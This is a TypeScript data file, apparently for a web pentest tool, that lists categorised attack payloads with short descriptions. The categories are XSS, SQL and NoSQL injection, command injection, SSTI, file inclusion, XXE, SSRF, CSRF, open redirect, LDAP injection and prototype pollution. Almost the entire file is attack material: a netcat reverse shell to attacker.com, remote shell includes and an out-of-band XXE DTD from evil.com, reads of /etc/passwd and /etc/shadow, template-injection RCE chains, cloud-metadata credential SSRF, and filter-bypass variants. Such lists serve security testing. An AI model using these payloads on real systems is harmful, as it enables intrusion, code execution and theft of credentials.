export const CATEGORIES = [
  "XSS",
  "SQLi",
  "CMDi",
  "SSTI",
  "LFI",
  "RFI",
  "XXE",
  "CSRF",
  "NoSQLi",
  "OpenRedirect",
  "SSRF", // New Category
  "LDAPi",
  "Prototype Pollution"
] as const;

export type Category = typeof CATEGORIES[number];

export type Payload = {
  payload: string;
  description: string;
  tags: string[];
};

export const PAYLOAD_DATA: Record<Category, Payload[]> = {
  XSS: [
    {
      payload: "<script>alert(origin)</script>",
      description: "Standard Script Injection: Fundamental test for reflected XSS.",
      tags: ["basic", "reflected"],
    },
    {
      payload: "\"><img src=x onerror=prompt(1)>",
      description: "Image Error Handler: Breaks out of attribute context and uses onerror event.",
      tags: ["html-tag", "bypass"],
    },
    {
      payload: "<svg/onload=alert(1)>",
      description: "SVG OnLoad: Bypasses <script> tag filters; fires immediately on render.",
      tags: ["svg", "bypass"],
    },
    {
      payload: "javascript:alert(1)",
      description: "URI Scheme: Executes JS when clicked in an href attribute.",
      tags: ["href", "protocol"],
    },
    {
      payload: "<details open ontoggle=alert(1)>",
      description: "Interaction-less: The 'open' attribute triggers the toggle event automatically.",
      tags: ["modern", "bypass"],
    },
    {
      payload: "'-alert(1)-'",
      description: "JS String Breakout: Injects into existing JS string variables.",
      tags: ["js-injection"],
    },
    {
      payload: "<body onpageshow=alert(1)>",
      description: "Body Event: Fires when the page is shown (persisted history navigation).",
      tags: ["html-body"],
    },
    {
      payload: "<input onfocus=alert(1) autofocus>",
      description: "Autofocus Vector: Triggers immediately without user input due to autofocus.",
      tags: ["html-tag", "interaction-less"],
    },
    {
      payload: "<iframe src=javascript:alert(1)>",
      description: "Iframe Protocol: Executes JS within the context of the iframe.",
      tags: ["iframe"],
    },
    {
      payload: "<x onanimationstart=alert(1)><style>x{animation:s forwards}@keyframes s{to{visibility:hidden}}</style>",
      description: "CSS Animation XSS: Uses CSS keyframes to trigger an event handler.",
      tags: ["advanced", "css"],
    },
    {
      payload: "eval('ale'+'rt(1)')",
      description: "Eval Obfuscation: Bypasses filters looking for 'alert' keyword.",
      tags: ["obfuscation"],
    }
  ],

  SQLi: [
    {
      payload: "' OR '1'='1' -- ",
      description: "Tautology Auth Bypass: Generic bypass for login forms.",
      tags: ["auth-bypass", "generic"],
    },
    {
      payload: "' UNION SELECT NULL, NULL, version() -- ",
      description: "Union Enumeration: Retrieves DB version (adjust NULL count).",
      tags: ["union", "enumeration"],
    },
    {
      payload: "'; WAITFOR DELAY '0:0:5'--",
      description: "MSSQL Time-Based: Pauses execution for 5 seconds.",
      tags: ["mssql", "time-based"],
    },
    {
      payload: "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
      description: "MySQL Time-Based: Forces MySQL to sleep for 5 seconds.",
      tags: ["mysql", "time-based"],
    },
    {
      payload: "admin' --",
      description: "Username Truncation: Ignores password check.",
      tags: ["auth-bypass"],
    },
    {
      payload: "ORDER BY 1--",
      description: "Column Enumeration: Identifies number of columns.",
      tags: ["enumeration"],
    },
    {
      payload: "' AND 1=CONVERT(int, (SELECT @@version)) --",
      description: "MSSQL Error-Based: Leaks version info via conversion error.",
      tags: ["error-based", "mssql"],
    },
    {
      payload: "(SELECT (CASE WHEN (1=1) THEN 1 ELSE 1/0 END))",
      description: "Oracle/Generic Boolean: Divides by zero if condition is false.",
      tags: ["boolean-based"],
    },
    {
      payload: "pg_sleep(10)",
      description: "PostgreSQL Time-Based: Specific command to sleep in Postgres.",
      tags: ["postgres", "time-based"],
    },
    {
      payload: "dbms_pipe.receive_message(('a'),10)",
      description: "Oracle Time-Based: Side-channel sleep attack for Oracle DB.",
      tags: ["oracle", "time-based"],
    },
    {
      payload: "' AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT version())))--",
      description: "MySQL Error-Based (XML): Leaks data via XML parsing error.",
      tags: ["mysql", "error-based"],
    }
  ],

  CMDi: [
    {
      payload: "; id",
      description: "Unix Chain: Executes 'id' after the first command.",
      tags: ["unix", "basic"],
    },
    {
      payload: "|| whoami",
      description: "OR Operator: Executes if previous command fails.",
      tags: ["operator"],
    },
    {
      payload: "`ping -c 3 127.0.0.1`",
      description: "Inline Execution: Executes inside backticks.",
      tags: ["inline"],
    },
    {
      payload: "$(cat /etc/passwd)",
      description: "Command Substitution: Modern bash syntax.",
      tags: ["file-read"],
    },
    {
      payload: "& ping -n 3 127.0.0.1",
      description: "Windows Background: Background execution operator.",
      tags: ["windows"],
    },
    {
      payload: "| netcat -e /bin/sh attacker.com 4444",
      description: "Reverse Shell: Pipes output to netcat.",
      tags: ["rce", "reverse-shell"],
    },
    {
      payload: "cat${IFS}/etc/passwd",
      description: "Space Bypass: Uses Internal Field Separator instead of spaces.",
      tags: ["bypass", "waf"],
    },
    {
      payload: ";{cat,/etc/passwd}",
      description: "Brace Expansion: Bash trick to avoid spaces.",
      tags: ["bypass", "bash"],
    }
  ],

  SSTI: [
    {
      payload: "{{7*7}}",
      description: "Basic Math: Twig/Jinja2 test.",
      tags: ["basic"],
    },
    {
      payload: "${7*7}",
      description: "Spring/Java EL: Java expression test.",
      tags: ["java"],
    },
    {
      payload: "<%= 7*7 %>",
      description: "ERB/EJS: Ruby/Node template test.",
      tags: ["ruby", "node"],
    },
    {
      payload: "{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}",
      description: "Jinja2 RCE: Python command execution chain.",
      tags: ["python", "rce"],
    },
    {
      payload: "#{''.class.forName('java.lang.Runtime').getRuntime().exec('whoami')}",
      description: "FreeMarker RCE: Java runtime execution.",
      tags: ["java", "rce"],
    },
    {
      payload: "${T(java.lang.Runtime).getRuntime().exec('calc')}",
      description: "Spring SpEL RCE: Java Spring Expression Language exploit.",
      tags: ["java", "spring"],
    }
  ],

  LFI: [
    {
      payload: "../../../../../etc/passwd",
      description: "Standard Traversal: Linux passwd file.",
      tags: ["linux", "basic"],
    },
    {
      payload: "..\\..\\..\\..\\windows\\win.ini",
      description: "Windows Traversal: Standard win.ini file.",
      tags: ["windows"],
    },
    {
      payload: "php://filter/convert.base64-encode/resource=index.php",
      description: "PHP Filter: Leak source code via Base64.",
      tags: ["php", "source-code"],
    },
    {
      payload: "....//....//....//etc/passwd",
      description: "Strip Bypass: Bypasses non-recursive sanitization.",
      tags: ["bypass"],
    },
    {
      payload: "/proc/self/environ",
      description: "Proc File: Reads environment variables (Shellshock/Log Poisoning).",
      tags: ["linux", "proc"],
    },
    {
      payload: "php://input",
      description: "PHP Input Stream: Execute POST data as PHP code.",
      tags: ["php", "rce"],
    },
    {
      payload: "expect://id",
      description: "PHP Expect: Executes system command directly.",
      tags: ["php", "rce"],
    }
  ],

  RFI: [
    {
      payload: "http://evil.com/shell.txt",
      description: "HTTP Include: Fetches remote shell.",
      tags: ["basic"],
    },
    {
      payload: "\\\\attacker_ip\\share\\malicious.php",
      description: "SMB/UNC Path: Windows remote include/hash capture.",
      tags: ["windows", "smb"],
    }
  ],

  XXE: [
    {
      payload: `<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>`,
      description: "Basic LFD: Reads local files via entity.",
      tags: ["file-read"],
    },
    {
      payload: `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>`,
      description: "Cloud Metadata: AWS SSRF via XXE.",
      tags: ["ssrf", "cloud"],
    },
    {
      payload: `<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xxe;</foo>`,
      description: "Encoding Bypass: Changes XML encoding to bypass WAFs.",
      tags: ["bypass"],
    },
    {
      payload: `<!DOCTYPE root [<!ENTITY % remote SYSTEM "http://evil.com/xxe.dtd">%remote;]>`,
      description: "Blind XXE: Out-of-band data exfiltration.",
      tags: ["blind", "oob"],
    }
  ],

  SSRF: [
    {
      payload: "http://127.0.0.1:80",
      description: "Loopback: Basic access to localhost services.",
      tags: ["basic"],
    },
    {
      payload: "http://169.254.169.254/latest/meta-data/",
      description: "AWS Metadata: Access cloud instance credentials.",
      tags: ["cloud", "aws"],
    },
    {
      payload: "http://0.0.0.0:80",
      description: "0.0.0.0 Bypass: Often bypasses 'localhost' string filters.",
      tags: ["bypass"],
    },
    {
      payload: "http://[::]:80",
      description: "IPv6 Loopback: Bypasses IPv4 filters.",
      tags: ["ipv6", "bypass"],
    },
    {
      payload: "http://metadata.google.internal/",
      description: "GCP Metadata: Google Cloud metadata endpoint.",
      tags: ["cloud", "gcp"],
    }
  ],

  CSRF: [
    {
      payload: `<form action="https://victim.com/api/change-password" method="POST"><input type="hidden" name="password" value="hacked"><input type="submit"></form><script>document.forms[0].submit()</script>`,
      description: "POST Auto-Submit: Standard POST CSRF PoC.",
      tags: ["poc", "auto-submit"],
    },
    {
      payload: `<img src="https://victim.com/api/delete?id=123">`,
      description: "GET-Based: Triggers state change via image load.",
      tags: ["get-method"],
    },
  ],

  NoSQLi: [
    {
      payload: `{ "$ne": null }`,
      description: "Not Equal Null: Bypasses authentication.",
      tags: ["mongodb", "auth-bypass"],
    },
    {
      payload: `{ "$gt": "" }`,
      description: "Greater Than Empty: Matches almost anything.",
      tags: ["mongodb"],
    },
    {
      payload: "admin' || '1'=='1",
      description: "JS Injection: Exploits $where clauses.",
      tags: ["javascript"],
    },
    {
      payload: `{"$regex": "a.*"}`,
      description: "Regex Extraction: Blind data exfiltration.",
      tags: ["regex", "exfiltration"],
    },
  ],

  OpenRedirect: [
    {
      payload: "https://evil.com",
      description: "Absolute URL: Standard redirect test.",
      tags: ["basic"],
    },
    {
      payload: "//evil.com",
      description: "Protocol Relative: Bypasses http/https filters.",
      tags: ["bypass"],
    },
    {
      payload: "/\\/evil.com",
      description: "Slash Escaping: Browser normalization bypass.",
      tags: ["bypass"],
    },
    {
      payload: "https://authorized.com@evil.com",
      description: "Cred Syntax: Treats authorized.com as username.",
      tags: ["bypass"],
    },
  ],
  
  LDAPi: [
    {
      payload: "*",
      description: "Wildcard: Basic auth bypass.",
      tags: ["auth-bypass"],
    },
    {
      payload: "*)(uid=*))(|(uid=*",
      description: "Filter Closure: Manipulates query logic.",
      tags: ["advanced"],
    },
    {
      payload: "admin*)((|userpassword=*)",
      description: "Attribute Discovery: Confirms hidden fields.",
      tags: ["blind"],
    }
  ],
  
  "Prototype Pollution": [
    {
      payload: `{"__proto__": {"isAdmin": true}}`,
      description: "Object Proto: Pollutes base object.",
      tags: ["json"],
    },
    {
      payload: `constructor[prototype][isAdmin]=true`,
      description: "Constructor: URL/Form pollution.",
      tags: ["url"],
    },
    {
      payload: `{"x": {"__proto__":{"path_to_shell":"/tmp/shell"}}}`,
      description: "Gadget Chain: Pollutes specific library properties.",
      tags: ["rce", "gadget"],
    }
  ]
};